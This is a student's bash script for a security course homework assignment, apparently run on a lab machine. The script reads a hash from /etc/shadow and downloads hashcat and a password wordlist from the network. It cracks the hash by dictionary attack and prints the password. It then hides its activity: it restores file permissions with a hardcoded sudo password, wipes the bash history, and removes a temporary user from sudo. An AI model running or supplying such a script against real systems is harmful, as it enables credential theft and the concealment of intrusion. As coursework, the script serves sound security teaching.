# Hanna Salings
# 12381101
# Due 09/18/2017
# CS 3600 HW2

{
cd
mkdir hash
cd hash

wget https://hashcat.net/files_legacy/hashcat-2.00.7z # install hashcat 2.00
7z e hashcat-2.00.7z
./hashcat-cli64.bin -V

tail -n 1 /etc/shadow > crack1.hash # store the hash in crack1.hash

#sed 's/yourboss://g' crack1.hash > cracked2.hash
#sed 's/.:17419:0:99999:7::://g' cracked2.hash > cracked.hash

# using this instead of sed since the hash may be different
cut -d ":" -f2- crack1.hash > crack2.hash # removes the extra first part before the hash 
cut -d ":" -f1 crack2.hash > cracked.hash # removes the extra last part after the hash

# put password list from website into a text document
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_1000.txt > passwordList.txt

./hashcat-cli64.bin -m 1800 -a 0 -o passwordFound.txt --remove cracked.hash passwordList.txt
} &>/dev/null # &>/dev/null used to not show the extra outputs during the run

cut -d ":" -f2 passwordFound.txt > password.txt # gets only the actual password and not the hash as well
cat password.txt # output the password to the screen

mv ~/hash/password.txt ~ # send the password.txt to the home directory
#mv ~/hash/password.txt ~/Desktop # used this to quickly check if password.txt was created during testing

cd ..
rm -rf hash # delete the hash directory

# some notes for reference:
# ls -la /etc/passwd to check permissions
# sudo chmod 7777 /etc/passwd or /etc/shadow to change permissions back
# 640 for /etc/shadow to fix permissions to match the secure Debian defaults
# 644 for /etc/passwd to fix permissions

echo "correctbatteryhorsestaple99" | sudo -S chmod 640 /etc/shadow # fix permissions of shadow files

echo "correctbatteryhorsestaple99" | sudo -S chmod 644 /etc/passwd # fix permissions of password files

# next few lines are for deleting bash history
cd ~
HISTFILE=!/.bash_history
set -o history

cat /dev/null > ~/.bash_history && history -c && history -w # deletes the bash history
# cat ~/.bash_history used to view the bash history

echo "correctbatteryhorsestaple99" | sudo deluser tempworker sudo # delete tempuser from sudo'ers group